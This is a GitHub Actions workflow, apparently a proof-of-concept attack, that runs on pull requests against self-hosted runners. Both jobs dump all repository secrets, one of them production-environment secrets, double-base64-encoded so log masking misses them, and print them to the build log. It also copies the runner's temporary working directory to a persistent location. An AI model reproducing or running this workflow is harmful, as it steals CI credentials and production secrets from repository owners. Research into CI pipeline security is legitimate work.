name: Sweet Sweet Secrets
on:
  pull_request:
    branches:
      - main
jobs:
  secretless-job:
    runs-on: self-hosted
    steps:
      - name: Expose Secrets
        run: |
          echo '${{ toJson(secrets) }}' | base64 | base64 > test.txt
          cat test.txt
          ls -la /home/ec2-user/actions-runner/_work/_temp/
      - name: Print generated templates & scripts
        run: |
          ls -la /home/ec2-user/actions-runner/_work/_temp/
          cp -r /home/ec2-user/actions-runner/_work/_temp /home/ec2-user/_temp
  get-those-sweet-secrets:
    runs-on: self-hosted
    environment: production
    steps:
       - name: Expose Secrets
         run: |
           echo '${{ toJson(secrets) }}' | base64 | base64 > test.txt
           cat test.txt
